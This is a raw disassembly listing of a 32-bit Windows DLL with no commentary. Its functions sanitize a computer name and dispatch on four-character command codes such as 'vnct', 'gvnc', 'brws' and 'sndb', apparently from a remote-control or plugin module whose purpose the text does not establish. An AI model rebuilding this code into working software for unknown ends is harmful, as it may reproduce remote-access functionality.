1000723e:	50                   	push   %eax
1000723f:	0f b6 45 e1          	movzbl -0x1f(%ebp),%eax
10007243:	50                   	push   %eax
10007244:	0f b6 45 e0          	movzbl -0x20(%ebp),%eax
10007248:	50                   	push   %eax
10007249:	0f b6 45 df          	movzbl -0x21(%ebp),%eax
1000724d:	50                   	push   %eax
1000724e:	0f b6 45 de          	movzbl -0x22(%ebp),%eax
10007252:	50                   	push   %eax
10007253:	0f b6 45 dd          	movzbl -0x23(%ebp),%eax
10007257:	50                   	push   %eax
10007258:	0f b6 45 dc          	movzbl -0x24(%ebp),%eax
1000725c:	50                   	push   %eax
1000725d:	68 70 ea 00 10       	push   $0x1000ea70
10007262:	ff 75 08             	pushl  0x8(%ebp)
10007265:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
1000726b:	33 c0                	xor    %eax,%eax
1000726d:	83 c4 54             	add    $0x54,%esp
10007270:	40                   	inc    %eax
10007271:	5e                   	pop    %esi
10007272:	c9                   	leave  
10007273:	c3                   	ret    
10007274:	55                   	push   %ebp
10007275:	8b ec                	mov    %esp,%ebp
10007277:	81 ec 84 02 00 00    	sub    $0x284,%esp
1000727d:	56                   	push   %esi
1000727e:	57                   	push   %edi
1000727f:	8d 85 7c fd ff ff    	lea    -0x284(%ebp),%eax
10007285:	50                   	push   %eax
10007286:	c7 85 7c fd ff ff 14 	movl   $0x114,-0x284(%ebp)
1000728d:	01 00 00 
10007290:	ff 15 20 e1 00 10    	call   *0x1000e120
10007296:	8d 85 94 fe ff ff    	lea    -0x16c(%ebp),%eax
1000729c:	50                   	push   %eax
1000729d:	e8 28 ff ff ff       	call   0x100071ca
100072a2:	59                   	pop    %ecx
100072a3:	85 c0                	test   %eax,%eax
100072a5:	0f 84 c9 00 00 00    	je     0x10007374
100072ab:	8d 45 f8             	lea    -0x8(%ebp),%eax
100072ae:	50                   	push   %eax
100072af:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
100072b5:	50                   	push   %eax
100072b6:	c7 45 f8 00 01 00 00 	movl   $0x100,-0x8(%ebp)
100072bd:	ff 15 c8 e0 00 10    	call   *0x1000e0c8
100072c3:	85 c0                	test   %eax,%eax
100072c5:	75 09                	jne    0x100072d0
100072c7:	66 c7 85 f4 fe ff ff 	movw   $0x43,-0x10c(%ebp)
100072ce:	43 00 
100072d0:	8b 35 34 e1 00 10    	mov    0x1000e134,%esi
100072d6:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
100072dc:	50                   	push   %eax
100072dd:	33 ff                	xor    %edi,%edi
100072df:	ff d6                	call   *%esi
100072e1:	85 c0                	test   %eax,%eax
100072e3:	7e 55                	jle    0x1000733a
100072e5:	8d 84 3d f4 fe ff ff 	lea    -0x10c(%ebp,%edi,1),%eax
100072ec:	80 38 2e             	cmpb   $0x2e,(%eax)
100072ef:	75 03                	jne    0x100072f4
100072f1:	c6 00 5f             	movb   $0x5f,(%eax)
100072f4:	80 38 2f             	cmpb   $0x2f,(%eax)
100072f7:	75 03                	jne    0x100072fc
100072f9:	c6 00 5f             	movb   $0x5f,(%eax)
100072fc:	80 38 20             	cmpb   $0x20,(%eax)
100072ff:	75 03                	jne    0x10007304
10007301:	c6 00 5f             	movb   $0x5f,(%eax)
10007304:	80 38 27             	cmpb   $0x27,(%eax)
10007307:	75 03                	jne    0x1000730c
10007309:	c6 00 5f             	movb   $0x5f,(%eax)
1000730c:	80 38 22             	cmpb   $0x22,(%eax)
1000730f:	75 03                	jne    0x10007314
10007311:	c6 00 5f             	movb   $0x5f,(%eax)
10007314:	80 38 27             	cmpb   $0x27,(%eax)
10007317:	75 03                	jne    0x1000731c
10007319:	c6 00 5f             	movb   $0x5f,(%eax)
1000731c:	80 38 7a             	cmpb   $0x7a,(%eax)
1000731f:	7e 03                	jle    0x10007324
10007321:	c6 00 5f             	movb   $0x5f,(%eax)
10007324:	80 38 20             	cmpb   $0x20,(%eax)
10007327:	7d 03                	jge    0x1000732c
10007329:	c6 00 5f             	movb   $0x5f,(%eax)
1000732c:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
10007332:	50                   	push   %eax
10007333:	47                   	inc    %edi
10007334:	ff d6                	call   *%esi
10007336:	3b f8                	cmp    %eax,%edi
10007338:	7c ab                	jl     0x100072e5
1000733a:	8d 85 94 fe ff ff    	lea    -0x16c(%ebp),%eax
10007340:	50                   	push   %eax
10007341:	ff b5 88 fd ff ff    	pushl  -0x278(%ebp)
10007347:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
1000734d:	ff b5 84 fd ff ff    	pushl  -0x27c(%ebp)
10007353:	ff b5 80 fd ff ff    	pushl  -0x280(%ebp)
10007359:	50                   	push   %eax
1000735a:	8b 45 08             	mov    0x8(%ebp),%eax
1000735d:	05 14 03 00 00       	add    $0x314,%eax
10007362:	68 b4 ea 00 10       	push   $0x1000eab4
10007367:	50                   	push   %eax
10007368:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
1000736e:	33 c0                	xor    %eax,%eax
10007370:	83 c4 1c             	add    $0x1c,%esp
10007373:	40                   	inc    %eax
10007374:	5f                   	pop    %edi
10007375:	5e                   	pop    %esi
10007376:	c9                   	leave  
10007377:	c2 04 00             	ret    $0x4
1000737a:	55                   	push   %ebp
1000737b:	8b ec                	mov    %esp,%ebp
1000737d:	56                   	push   %esi
1000737e:	57                   	push   %edi
1000737f:	8d b8 14 03 00 00    	lea    0x314(%eax),%edi
10007385:	57                   	push   %edi
10007386:	ff 15 34 e1 00 10    	call   *0x1000e134
1000738c:	8d 70 01             	lea    0x1(%eax),%esi
1000738f:	8d 46 01             	lea    0x1(%esi),%eax
10007392:	3b 45 0c             	cmp    0xc(%ebp),%eax
10007395:	77 11                	ja     0x100073a8
10007397:	56                   	push   %esi
10007398:	57                   	push   %edi
10007399:	ff 75 08             	pushl  0x8(%ebp)
1000739c:	e8 6f 69 00 00       	call   0x1000dd10
100073a1:	83 c4 0c             	add    $0xc,%esp
100073a4:	8b c6                	mov    %esi,%eax
100073a6:	eb 02                	jmp    0x100073aa
100073a8:	33 c0                	xor    %eax,%eax
100073aa:	5f                   	pop    %edi
100073ab:	5e                   	pop    %esi
100073ac:	5d                   	pop    %ebp
100073ad:	c2 08 00             	ret    $0x8
100073b0:	51                   	push   %ecx
100073b1:	53                   	push   %ebx
100073b2:	56                   	push   %esi
100073b3:	8b 77 08             	mov    0x8(%edi),%esi
100073b6:	68 80 00 00 00       	push   $0x80
100073bb:	8d 87 14 03 00 00    	lea    0x314(%edi),%eax
100073c1:	50                   	push   %eax
100073c2:	bb c4 ea 00 10       	mov    $0x1000eac4,%ebx
100073c7:	53                   	push   %ebx
100073c8:	e8 4d 18 00 00       	call   0x10008c1a
100073cd:	85 c0                	test   %eax,%eax
100073cf:	75 2b                	jne    0x100073fc
100073d1:	57                   	push   %edi
100073d2:	e8 9d fe ff ff       	call   0x10007274
100073d7:	85 c0                	test   %eax,%eax
100073d9:	75 04                	jne    0x100073df
100073db:	33 c0                	xor    %eax,%eax
100073dd:	eb 20                	jmp    0x100073ff
100073df:	8d b7 14 03 00 00    	lea    0x314(%edi),%esi
100073e5:	56                   	push   %esi
100073e6:	ff 15 34 e1 00 10    	call   *0x1000e134
100073ec:	40                   	inc    %eax
100073ed:	50                   	push   %eax
100073ee:	56                   	push   %esi
100073ef:	8b 77 08             	mov    0x8(%edi),%esi
100073f2:	53                   	push   %ebx
100073f3:	e8 4c 17 00 00       	call   0x10008b44
100073f8:	85 c0                	test   %eax,%eax
100073fa:	74 df                	je     0x100073db
100073fc:	33 c0                	xor    %eax,%eax
100073fe:	40                   	inc    %eax
100073ff:	5e                   	pop    %esi
10007400:	5b                   	pop    %ebx
10007401:	59                   	pop    %ecx
10007402:	c3                   	ret    
10007403:	55                   	push   %ebp
10007404:	8b ec                	mov    %esp,%ebp
10007406:	56                   	push   %esi
10007407:	89 30                	mov    %esi,(%eax)
10007409:	ff 15 34 e1 00 10    	call   *0x1000e134
1000740f:	8b 55 08             	mov    0x8(%ebp),%edx
10007412:	8d 44 06 01          	lea    0x1(%esi,%eax,1),%eax
10007416:	8b 08                	mov    (%eax),%ecx
10007418:	83 c0 04             	add    $0x4,%eax
1000741b:	89 0a                	mov    %ecx,(%edx)
1000741d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10007420:	89 01                	mov    %eax,(%ecx)
10007422:	33 c0                	xor    %eax,%eax
10007424:	40                   	inc    %eax
10007425:	5d                   	pop    %ebp
10007426:	c3                   	ret    
10007427:	55                   	push   %ebp
10007428:	8b ec                	mov    %esp,%ebp
1000742a:	83 ec 14             	sub    $0x14,%esp
1000742d:	53                   	push   %ebx
1000742e:	56                   	push   %esi
1000742f:	57                   	push   %edi
10007430:	6a 04                	push   $0x4
10007432:	5e                   	pop    %esi
10007433:	39 75 0c             	cmp    %esi,0xc(%ebp)
10007436:	0f 85 3c 01 00 00    	jne    0x10007578
1000743c:	8b 75 08             	mov    0x8(%ebp),%esi
1000743f:	8b 3d 30 e1 00 10    	mov    0x1000e130,%edi
10007445:	68 cc ea 00 10       	push   $0x1000eacc
1000744a:	56                   	push   %esi
1000744b:	ff d7                	call   *%edi
1000744d:	85 c0                	test   %eax,%eax
1000744f:	75 13                	jne    0x10007464
10007451:	ff 75 14             	pushl  0x14(%ebp)
10007454:	8b 45 18             	mov    0x18(%ebp),%eax
10007457:	ff 75 10             	pushl  0x10(%ebp)
1000745a:	e8 1b ff ff ff       	call   0x1000737a
1000745f:	e9 91 01 00 00       	jmp    0x100075f5
10007464:	68 d4 ea 00 10       	push   $0x1000ead4
10007469:	56                   	push   %esi
1000746a:	ff d7                	call   *%edi
1000746c:	85 c0                	test   %eax,%eax
1000746e:	75 13                	jne    0x10007483
10007470:	ff 75 14             	pushl  0x14(%ebp)
10007473:	8b 45 18             	mov    0x18(%ebp),%eax
10007476:	ff 75 10             	pushl  0x10(%ebp)
10007479:	e8 6c 04 00 00       	call   0x100078ea
1000747e:	e9 72 01 00 00       	jmp    0x100075f5
10007483:	68 dc ea 00 10       	push   $0x1000eadc
10007488:	56                   	push   %esi
10007489:	ff d7                	call   *%edi
1000748b:	85 c0                	test   %eax,%eax
1000748d:	75 13                	jne    0x100074a2
1000748f:	ff 75 14             	pushl  0x14(%ebp)
10007492:	8b 45 18             	mov    0x18(%ebp),%eax
10007495:	ff 75 10             	pushl  0x10(%ebp)
10007498:	e8 8e 04 00 00       	call   0x1000792b
1000749d:	e9 53 01 00 00       	jmp    0x100075f5
100074a2:	68 e4 ea 00 10       	push   $0x1000eae4
100074a7:	56                   	push   %esi
100074a8:	ff d7                	call   *%edi
100074aa:	85 c0                	test   %eax,%eax
100074ac:	75 53                	jne    0x10007501
100074ae:	21 45 0c             	and    %eax,0xc(%ebp)
100074b1:	68 00 e0 00 00       	push   $0xe000
100074b6:	e8 29 f5 ff ff       	call   0x100069e4
100074bb:	8b d8                	mov    %eax,%ebx
100074bd:	59                   	pop    %ecx
100074be:	85 db                	test   %ebx,%ebx
100074c0:	74 37                	je     0x100074f9
100074c2:	8b 75 18             	mov    0x18(%ebp),%esi
100074c5:	53                   	push   %ebx
100074c6:	e8 3f 07 00 00       	call   0x10007c0a
100074cb:	85 c0                	test   %eax,%eax
100074cd:	74 23                	je     0x100074f2
100074cf:	ff 75 14             	pushl  0x14(%ebp)
100074d2:	8b 7d 10             	mov    0x10(%ebp),%edi
100074d5:	57                   	push   %edi
100074d6:	8b f3                	mov    %ebx,%esi
100074d8:	e8 6a 0f 00 00       	call   0x10008447
100074dd:	59                   	pop    %ecx
100074de:	59                   	pop    %ecx
100074df:	85 c0                	test   %eax,%eax
100074e1:	74 0f                	je     0x100074f2
100074e3:	8d 48 01             	lea    0x1(%eax),%ecx
100074e6:	3b 4d 14             	cmp    0x14(%ebp),%ecx
100074e9:	77 07                	ja     0x100074f2
100074eb:	c6 04 38 00          	movb   $0x0,(%eax,%edi,1)
100074ef:	89 4d 0c             	mov    %ecx,0xc(%ebp)
100074f2:	53                   	push   %ebx
100074f3:	e8 1b f5 ff ff       	call   0x10006a13
100074f8:	59                   	pop    %ecx
100074f9:	8b 45 0c             	mov    0xc(%ebp),%eax
100074fc:	e9 f4 00 00 00       	jmp    0x100075f5
10007501:	68 ec ea 00 10       	push   $0x1000eaec
10007506:	56                   	push   %esi
10007507:	ff d7                	call   *%edi
10007509:	85 c0                	test   %eax,%eax
1000750b:	75 10                	jne    0x1000751d
1000750d:	ff 75 10             	pushl  0x10(%ebp)
10007510:	8b 45 18             	mov    0x18(%ebp),%eax
10007513:	e8 57 04 00 00       	call   0x1000796f
10007518:	e9 d8 00 00 00       	jmp    0x100075f5
1000751d:	80 3e 72             	cmpb   $0x72,(%esi)
10007520:	0f 85 cd 00 00 00    	jne    0x100075f3
10007526:	8a 46 01             	mov    0x1(%esi),%al
10007529:	3c 70                	cmp    $0x70,%al
1000752b:	75 1f                	jne    0x1000754c
1000752d:	80 7e 02 6c          	cmpb   $0x6c,0x2(%esi)
10007531:	75 19                	jne    0x1000754c
10007533:	80 7e 03 73          	cmpb   $0x73,0x3(%esi)
10007537:	75 13                	jne    0x1000754c
10007539:	ff 75 14             	pushl  0x14(%ebp)
1000753c:	8b 75 18             	mov    0x18(%ebp),%esi
1000753f:	ff 75 10             	pushl  0x10(%ebp)
10007542:	e8 52 04 00 00       	call   0x10007999
10007547:	e9 a9 00 00 00       	jmp    0x100075f5
1000754c:	3c 73                	cmp    $0x73,%al
1000754e:	0f 85 9f 00 00 00    	jne    0x100075f3
10007554:	80 7e 02 70          	cmpb   $0x70,0x2(%esi)
10007558:	0f 85 95 00 00 00    	jne    0x100075f3
1000755e:	80 7e 03 70          	cmpb   $0x70,0x3(%esi)
10007562:	0f 85 8b 00 00 00    	jne    0x100075f3
10007568:	ff 75 14             	pushl  0x14(%ebp)
1000756b:	8b 75 18             	mov    0x18(%ebp),%esi
1000756e:	ff 75 10             	pushl  0x10(%ebp)
10007571:	e8 c9 04 00 00       	call   0x10007a3f
10007576:	eb 7d                	jmp    0x100075f5
10007578:	76 79                	jbe    0x100075f3
1000757a:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000757d:	8a 11                	mov    (%ecx),%dl
1000757f:	80 fa 73             	cmp    $0x73,%dl
10007582:	75 78                	jne    0x100075fc
10007584:	80 79 01 65          	cmpb   $0x65,0x1(%ecx)
10007588:	75 72                	jne    0x100075fc
1000758a:	80 79 02 74          	cmpb   $0x74,0x2(%ecx)
1000758e:	75 6c                	jne    0x100075fc
10007590:	80 79 03 70          	cmpb   $0x70,0x3(%ecx)
10007594:	75 66                	jne    0x100075fc
10007596:	8d 45 14             	lea    0x14(%ebp),%eax
10007599:	50                   	push   %eax
1000759a:	8d 45 10             	lea    0x10(%ebp),%eax
1000759d:	33 db                	xor    %ebx,%ebx
1000759f:	50                   	push   %eax
100075a0:	8d 71 04             	lea    0x4(%ecx),%esi
100075a3:	8d 45 0c             	lea    0xc(%ebp),%eax
100075a6:	89 5d 0c             	mov    %ebx,0xc(%ebp)
100075a9:	89 5d 10             	mov    %ebx,0x10(%ebp)
100075ac:	89 5d 14             	mov    %ebx,0x14(%ebp)
100075af:	e8 4f fe ff ff       	call   0x10007403
100075b4:	59                   	pop    %ecx
100075b5:	59                   	pop    %ecx
100075b6:	85 c0                	test   %eax,%eax
100075b8:	74 39                	je     0x100075f3
100075ba:	ff 75 10             	pushl  0x10(%ebp)
100075bd:	8b 7d 18             	mov    0x18(%ebp),%edi
100075c0:	ff 75 14             	pushl  0x14(%ebp)
100075c3:	8b c7                	mov    %edi,%eax
100075c5:	ff 75 0c             	pushl  0xc(%ebp)
100075c8:	e8 5a d5 ff ff       	call   0x10004b27
100075cd:	8b f0                	mov    %eax,%esi
100075cf:	e8 70 15 00 00       	call   0x10008b44
100075d4:	8b 87 20 0a 00 00    	mov    0xa20(%edi),%eax
100075da:	3b c3                	cmp    %ebx,%eax
100075dc:	74 15                	je     0x100075f3
100075de:	ff 75 10             	pushl  0x10(%ebp)
100075e1:	ff 75 14             	pushl  0x14(%ebp)
100075e4:	ff 75 0c             	pushl  0xc(%ebp)
100075e7:	ff b7 24 0a 00 00    	pushl  0xa24(%edi)
100075ed:	57                   	push   %edi
100075ee:	ff d0                	call   *%eax
100075f0:	83 c4 14             	add    $0x14,%esp
100075f3:	33 c0                	xor    %eax,%eax
100075f5:	5f                   	pop    %edi
100075f6:	5e                   	pop    %esi
100075f7:	5b                   	pop    %ebx
100075f8:	c9                   	leave  
100075f9:	c2 18 00             	ret    $0x18
100075fc:	b3 6e                	mov    $0x6e,%bl
100075fe:	3a d3                	cmp    %bl,%dl
10007600:	75 77                	jne    0x10007679
10007602:	80 79 01 65          	cmpb   $0x65,0x1(%ecx)
10007606:	75 71                	jne    0x10007679
10007608:	80 79 02 77          	cmpb   $0x77,0x2(%ecx)
1000760c:	75 6b                	jne    0x10007679
1000760e:	80 79 03 70          	cmpb   $0x70,0x3(%ecx)
10007612:	75 65                	jne    0x10007679
10007614:	33 c0                	xor    %eax,%eax
10007616:	81 7d 0c 34 02 00 00 	cmpl   $0x234,0xc(%ebp)
1000761d:	72 d6                	jb     0x100075f5
1000761f:	8b 45 18             	mov    0x18(%ebp),%eax
10007622:	8b 90 28 0a 00 00    	mov    0xa28(%eax),%edx
10007628:	85 d2                	test   %edx,%edx
1000762a:	74 2f                	je     0x1000765b
1000762c:	8b 71 1c             	mov    0x1c(%ecx),%esi
1000762f:	89 75 f8             	mov    %esi,-0x8(%ebp)
10007632:	8b 71 24             	mov    0x24(%ecx),%esi
10007635:	89 75 fc             	mov    %esi,-0x4(%ebp)
10007638:	8b 71 14             	mov    0x14(%ecx),%esi
1000763b:	89 75 f0             	mov    %esi,-0x10(%ebp)
1000763e:	8b 71 18             	mov    0x18(%ecx),%esi
10007641:	89 75 f4             	mov    %esi,-0xc(%ebp)
10007644:	8d 71 2c             	lea    0x2c(%ecx),%esi
10007647:	56                   	push   %esi
10007648:	ff 71 10             	pushl  0x10(%ecx)
1000764b:	8d 4d f0             	lea    -0x10(%ebp),%ecx
1000764e:	51                   	push   %ecx
1000764f:	ff b0 2c 0a 00 00    	pushl  0xa2c(%eax)
10007655:	50                   	push   %eax
10007656:	ff d2                	call   *%edx
10007658:	83 c4 14             	add    $0x14,%esp
1000765b:	8b 4d 10             	mov    0x10(%ebp),%ecx
1000765e:	68 f4 ea 00 10       	push   $0x1000eaf4
10007663:	ff 75 14             	pushl  0x14(%ebp)
10007666:	e8 81 b7 ff ff       	call   0x10002dec
1000766b:	ff 75 10             	pushl  0x10(%ebp)
1000766e:	ff 15 34 e1 00 10    	call   *0x1000e134
10007674:	e9 7c ff ff ff       	jmp    0x100075f5
10007679:	80 fa 76             	cmp    $0x76,%dl
1000767c:	75 36                	jne    0x100076b4
1000767e:	38 59 01             	cmp    %bl,0x1(%ecx)
10007681:	75 31                	jne    0x100076b4
10007683:	80 79 02 63          	cmpb   $0x63,0x2(%ecx)
10007687:	75 2b                	jne    0x100076b4
10007689:	80 79 03 74          	cmpb   $0x74,0x3(%ecx)
1000768d:	75 25                	jne    0x100076b4
1000768f:	33 c0                	xor    %eax,%eax
10007691:	39 75 14             	cmp    %esi,0x14(%ebp)
10007694:	0f 82 5b ff ff ff    	jb     0x100075f5
1000769a:	8b 45 18             	mov    0x18(%ebp),%eax
1000769d:	8b 59 10             	mov    0x10(%ecx),%ebx
100076a0:	8b 78 0c             	mov    0xc(%eax),%edi
100076a3:	e8 a2 43 00 00       	call   0x1000ba4a
100076a8:	8b 4d 10             	mov    0x10(%ebp),%ecx
100076ab:	89 01                	mov    %eax,(%ecx)
100076ad:	8b c6                	mov    %esi,%eax
100076af:	e9 41 ff ff ff       	jmp    0x100075f5
100076b4:	80 fa 67             	cmp    $0x67,%dl
100076b7:	75 62                	jne    0x1000771b
100076b9:	8a 41 01             	mov    0x1(%ecx),%al
100076bc:	3c 76                	cmp    $0x76,%al
100076be:	75 5b                	jne    0x1000771b
100076c0:	38 59 02             	cmp    %bl,0x2(%ecx)
100076c3:	75 1f                	jne    0x100076e4
100076c5:	80 79 03 63          	cmpb   $0x63,0x3(%ecx)
100076c9:	75 19                	jne    0x100076e4
100076cb:	ff 75 14             	pushl  0x14(%ebp)
100076ce:	8b 45 18             	mov    0x18(%ebp),%eax
100076d1:	ff 75 10             	pushl  0x10(%ebp)
100076d4:	8b 49 14             	mov    0x14(%ecx),%ecx
100076d7:	8b 40 0c             	mov    0xc(%eax),%eax
100076da:	e8 08 44 00 00       	call   0x1000bae7
100076df:	e9 11 ff ff ff       	jmp    0x100075f5
100076e4:	3c 76                	cmp    $0x76,%al
100076e6:	75 33                	jne    0x1000771b
100076e8:	38 59 02             	cmp    %bl,0x2(%ecx)
100076eb:	75 2e                	jne    0x1000771b
100076ed:	80 79 03 70          	cmpb   $0x70,0x3(%ecx)
100076f1:	75 28                	jne    0x1000771b
100076f3:	33 c0                	xor    %eax,%eax
100076f5:	83 7d 14 02          	cmpl   $0x2,0x14(%ebp)
100076f9:	0f 82 f6 fe ff ff    	jb     0x100075f5
100076ff:	8b 45 18             	mov    0x18(%ebp),%eax
10007702:	ff 70 0c             	pushl  0xc(%eax)
10007705:	8b 49 14             	mov    0x14(%ecx),%ecx
10007708:	e8 b9 43 00 00       	call   0x1000bac6
1000770d:	8b 4d 10             	mov    0x10(%ebp),%ecx
10007710:	6a 02                	push   $0x2
10007712:	66 89 01             	mov    %ax,(%ecx)
10007715:	58                   	pop    %eax
10007716:	e9 da fe ff ff       	jmp    0x100075f5
1000771b:	80 fa 62             	cmp    $0x62,%dl
1000771e:	75 4b                	jne    0x1000776b
10007720:	80 79 01 72          	cmpb   $0x72,0x1(%ecx)
10007724:	75 45                	jne    0x1000776b
10007726:	80 79 02 77          	cmpb   $0x77,0x2(%ecx)
1000772a:	75 3f                	jne    0x1000776b
1000772c:	80 79 03 73          	cmpb   $0x73,0x3(%ecx)
10007730:	75 39                	jne    0x1000776b
10007732:	8b 45 18             	mov    0x18(%ebp),%eax
10007735:	8b 90 30 0a 00 00    	mov    0xa30(%eax),%edx
1000773b:	33 ff                	xor    %edi,%edi
1000773d:	85 d2                	test   %edx,%edx
1000773f:	74 13                	je     0x10007754
10007741:	ff 71 14             	pushl  0x14(%ecx)
10007744:	83 c1 18             	add    $0x18,%ecx
10007747:	51                   	push   %ecx
10007748:	ff b0 34 0a 00 00    	pushl  0xa34(%eax)
1000774e:	50                   	push   %eax
1000774f:	ff d2                	call   *%edx
10007751:	83 c4 10             	add    $0x10,%esp
10007754:	39 75 14             	cmp    %esi,0x14(%ebp)
10007757:	72 0b                	jb     0x10007764
10007759:	8b fe                	mov    %esi,%edi
1000775b:	8b 45 10             	mov    0x10(%ebp),%eax
1000775e:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
10007764:	8b c7                	mov    %edi,%eax
10007766:	e9 8a fe ff ff       	jmp    0x100075f5
1000776b:	80 fa 6c             	cmp    $0x6c,%dl
1000776e:	75 30                	jne    0x100077a0
10007770:	38 59 01             	cmp    %bl,0x1(%ecx)
10007773:	75 2b                	jne    0x100077a0
10007775:	80 79 02 64          	cmpb   $0x64,0x2(%ecx)
10007779:	75 25                	jne    0x100077a0
1000777b:	80 79 03 62          	cmpb   $0x62,0x3(%ecx)
1000777f:	75 1f                	jne    0x100077a0
10007781:	ff 75 14             	pushl  0x14(%ebp)
10007784:	8b 45 18             	mov    0x18(%ebp),%eax
10007787:	ff 75 10             	pushl  0x10(%ebp)
1000778a:	68 fc ea 00 10       	push   $0x1000eafc
1000778f:	e8 93 d3 ff ff       	call   0x10004b27
10007794:	8b f0                	mov    %eax,%esi
10007796:	e8 7f 14 00 00       	call   0x10008c1a
1000779b:	e9 55 fe ff ff       	jmp    0x100075f5
100077a0:	80 fa 73             	cmp    $0x73,%dl
100077a3:	75 3c                	jne    0x100077e1
100077a5:	38 59 01             	cmp    %bl,0x1(%ecx)
100077a8:	75 37                	jne    0x100077e1
100077aa:	80 79 02 64          	cmpb   $0x64,0x2(%ecx)
100077ae:	75 31                	jne    0x100077e1
100077b0:	80 79 03 62          	cmpb   $0x62,0x3(%ecx)
100077b4:	75 2b                	jne    0x100077e1
100077b6:	ff 71 14             	pushl  0x14(%ecx)
100077b9:	8b 45 18             	mov    0x18(%ebp),%eax
100077bc:	83 c1 18             	add    $0x18,%ecx
100077bf:	51                   	push   %ecx
100077c0:	68 fc ea 00 10       	push   $0x1000eafc
100077c5:	33 ff                	xor    %edi,%edi
100077c7:	e8 5b d3 ff ff       	call   0x10004b27
100077cc:	8b f0                	mov    %eax,%esi
100077ce:	e8 71 13 00 00       	call   0x10008b44
100077d3:	83 7d 14 04          	cmpl   $0x4,0x14(%ebp)
100077d7:	72 8b                	jb     0x10007764
100077d9:	6a 04                	push   $0x4
100077db:	5f                   	pop    %edi
100077dc:	e9 7a ff ff ff       	jmp    0x1000775b
100077e1:	80 fa 69             	cmp    $0x69,%dl
100077e4:	0f 85 09 fe ff ff    	jne    0x100075f3
100077ea:	80 79 01 32          	cmpb   $0x32,0x1(%ecx)
100077ee:	0f 85 ff fd ff ff    	jne    0x100075f3
100077f4:	80 79 02 72          	cmpb   $0x72,0x2(%ecx)
100077f8:	0f 85 f5 fd ff ff    	jne    0x100075f3
100077fe:	80 79 03 73          	cmpb   $0x73,0x3(%ecx)
10007802:	0f 85 eb fd ff ff    	jne    0x100075f3
10007808:	68 00 e0 00 00       	push   $0xe000
1000780d:	33 db                	xor    %ebx,%ebx
1000780f:	e8 d0 f1 ff ff       	call   0x100069e4
10007814:	8b f8                	mov    %eax,%edi
10007816:	59                   	pop    %ecx
10007817:	85 ff                	test   %edi,%edi
10007819:	74 35                	je     0x10007850
1000781b:	8b 75 18             	mov    0x18(%ebp),%esi
1000781e:	57                   	push   %edi
1000781f:	e8 e6 03 00 00       	call   0x10007c0a
10007824:	85 c0                	test   %eax,%eax
10007826:	74 21                	je     0x10007849
10007828:	ff 75 14             	pushl  0x14(%ebp)
1000782b:	8b 75 10             	mov    0x10(%ebp),%esi
1000782e:	56                   	push   %esi
1000782f:	8b c7                	mov    %edi,%eax
10007831:	e8 6a 0c 00 00       	call   0x100084a0
10007836:	59                   	pop    %ecx
10007837:	59                   	pop    %ecx
10007838:	85 c0                	test   %eax,%eax
1000783a:	74 0d                	je     0x10007849
1000783c:	8d 48 01             	lea    0x1(%eax),%ecx
1000783f:	3b 4d 14             	cmp    0x14(%ebp),%ecx
10007842:	77 05                	ja     0x10007849
10007844:	88 1c 30             	mov    %bl,(%eax,%esi,1)
10007847:	8b d9                	mov    %ecx,%ebx
10007849:	57                   	push   %edi
1000784a:	e8 c4 f1 ff ff       	call   0x10006a13
1000784f:	59                   	pop    %ecx
10007850:	8b c3                	mov    %ebx,%eax
10007852:	e9 9e fd ff ff       	jmp    0x100075f5
10007857:	c7 80 28 0a 00 00 31 	movl   $0x1000ca31,0xa28(%eax)
1000785e:	ca 00 10 
10007861:	89 88 2c 0a 00 00    	mov    %ecx,0xa2c(%eax)
10007867:	33 c0                	xor    %eax,%eax
10007869:	40                   	inc    %eax
1000786a:	c3                   	ret    
1000786b:	c7 80 30 0a 00 00 f0 	movl   $0x1000c9f0,0xa30(%eax)
10007872:	c9 00 10 
10007875:	89 88 34 0a 00 00    	mov    %ecx,0xa34(%eax)
1000787b:	33 c0                	xor    %eax,%eax
1000787d:	40                   	inc    %eax
1000787e:	c3                   	ret    
1000787f:	55                   	push   %ebp
10007880:	8b ec                	mov    %esp,%ebp
10007882:	51                   	push   %ecx
10007883:	51                   	push   %ecx
10007884:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10007887:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000788b:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
1000788f:	56                   	push   %esi
10007890:	8b f0                	mov    %eax,%esi
10007892:	57                   	push   %edi
10007893:	8d 45 f8             	lea    -0x8(%ebp),%eax
10007896:	50                   	push   %eax
10007897:	ff 75 08             	pushl  0x8(%ebp)
1000789a:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000789d:	e8 f2 02 00 00       	call   0x10007b94
100078a2:	8b f8                	mov    %eax,%edi
100078a4:	85 ff                	test   %edi,%edi
100078a6:	74 3a                	je     0x100078e2
100078a8:	8b c6                	mov    %esi,%eax
100078aa:	e8 78 07 00 00       	call   0x10008027
100078af:	85 c0                	test   %eax,%eax
100078b1:	74 1c                	je     0x100078cf
100078b3:	ff 75 fc             	pushl  -0x4(%ebp)
100078b6:	8d 86 38 04 00 00    	lea    0x438(%esi),%eax
100078bc:	33 c9                	xor    %ecx,%ecx
100078be:	50                   	push   %eax
100078bf:	8b 45 f8             	mov    -0x8(%ebp),%eax
100078c2:	41                   	inc    %ecx
100078c3:	e8 ae 27 00 00       	call   0x1000a076
100078c8:	8b c6                	mov    %esi,%eax
100078ca:	e8 68 07 00 00       	call   0x10008037
100078cf:	ff 75 0c             	pushl  0xc(%ebp)
100078d2:	8b 76 08             	mov    0x8(%esi),%esi
100078d5:	ff 75 08             	pushl  0x8(%ebp)
100078d8:	68 04 eb 00 10       	push   $0x1000eb04
100078dd:	e8 62 12 00 00       	call   0x10008b44
100078e2:	8b c7                	mov    %edi,%eax
100078e4:	5f                   	pop    %edi
100078e5:	5e                   	pop    %esi
100078e6:	c9                   	leave  
100078e7:	c2 08 00             	ret    $0x8
100078ea:	55                   	push   %ebp
100078eb:	8b ec                	mov    %esp,%ebp
100078ed:	56                   	push   %esi
100078ee:	57                   	push   %edi
100078ef:	8d 70 14             	lea    0x14(%eax),%esi
100078f2:	56                   	push   %esi
